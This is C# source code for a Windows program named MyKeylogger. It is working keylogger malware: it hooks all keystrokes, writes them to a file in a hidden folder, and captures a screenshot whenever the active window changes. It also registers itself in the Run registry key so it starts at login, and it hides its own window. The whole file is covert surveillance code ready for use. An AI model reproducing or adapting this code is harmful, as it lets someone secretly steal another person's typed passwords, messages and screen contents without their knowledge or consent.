using Microsoft.Win32;
using MyKeylogger.Lib;
using MyKeylogger.Lib.WinApi;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MyKeylogger
{
    public partial class Form1 : Form
    {
        private readonly KeyboardHookListener keylistener;
        private IntPtr lastActiveWindow = IntPtr.Zero;
        private bool hasSubmitted;
        private readonly KeyMapper keyMapper = new KeyMapper();
        private ImageMapper imgMapper = new ImageMapper();

        //Define the path used to save the keylog file
        private readonly string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\myKeylogger.ini";

        // The path to the key where Windows looks for startup applications
        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);


        public Form1()
        {
            InitializeComponent();

            //Create Directory to save the files
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks").Attributes = FileAttributes.Directory | FileAttributes.Hidden;

            //Create the keylog file
            Functions.CreateFile();

            //Active Key Listener
            keylistener = new KeyboardHookListener(new GlobalHooker());
            keylistener.KeyDown += keylistener_KeyDown;

            //Set the application to run at startup
            // Check to see the current state (running at startup or not)
            if (rkApp.GetValue("MyKeylogger") == null)
            {
                // The value exists, the application is set to run at startup
                rkApp.SetValue("MyKeylogger", Application.ExecutablePath.ToString());
            }
            // The value exists, desactivate to run at startup
            //else
            //{

            //    rkApp.DeleteValue("MyKeylogger", false);
            //}

        }

        private void keylistener_KeyDown(object sender, KeyEventArgs e)
        {
            if (lastActiveWindow != Functions.GetForegroundWindow())
             {
                //Capturing a screenshot
                //Rectangle bounds = Screen.GetBounds(System.Drawing.Point.Empty);
                Rectangle bounds = Screen.PrimaryScreen.Bounds;

                //Getting the right resolution
                bounds.Height = (bounds.Height / 96) * 120;
                bounds.Width = (bounds.Width / 96) * 120;
                
                //Rectangle bounds = new Rectangle(0,0,1920,1080);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);
                    }
                    //Image file name
                    var format1 = @"{0}_{1}";
                    string fname = Functions.GetActiveWindowText();
                    if (fname.Length > 10)
                    {
                        fname = fname.Substring(0, 10);
                    }
                    var file_name = string.Format(format1, DateTime.Now, fname);
                    file_name = Functions.RemoveSpecialCharacters(file_name);

                    //Image file path
                    string file_path = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\ss-" + file_name + ".jpg";

                    //Add Image to List
                    imgMapper.AddImageToList(file_name, file_path, bitmap);

                    //Save Image
                    bitmap.Save(file_path, ImageFormat.Jpeg);
                }
                
                //Keylog header for new window
                var format = @"[""{0}"" {1}]" + Environment.NewLine + Environment.NewLine;
                var text = string.Format(format, Functions.GetActiveWindowText(), DateTime.Now);
                if (hasSubmitted)
                {
                    text = text.Insert(0, Environment.NewLine + Environment.NewLine);
                }
                //Save the text at the keylog string
                imgMapper.klog += text;
                //Add text to keylog file
                File.AppendAllText(filePath, text);
                hasSubmitted = true;
                lastActiveWindow = Functions.GetForegroundWindow();
            }
            //Get the keystroke
            var keyText = keyMapper.GetKeyText(e.KeyCode);
            //Save the text at the keylog string
            imgMapper.klog += keyText;
            //Add text to keylog file
            File.AppendAllText(filePath, keyText);
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            keylistener.Enabled = true;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            keylistener.Enabled = false;
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            //Set the form windows as hiden and minimized
            this.WindowState = FormWindowState.Minimized;
            this.Hide();
        }
    }
}
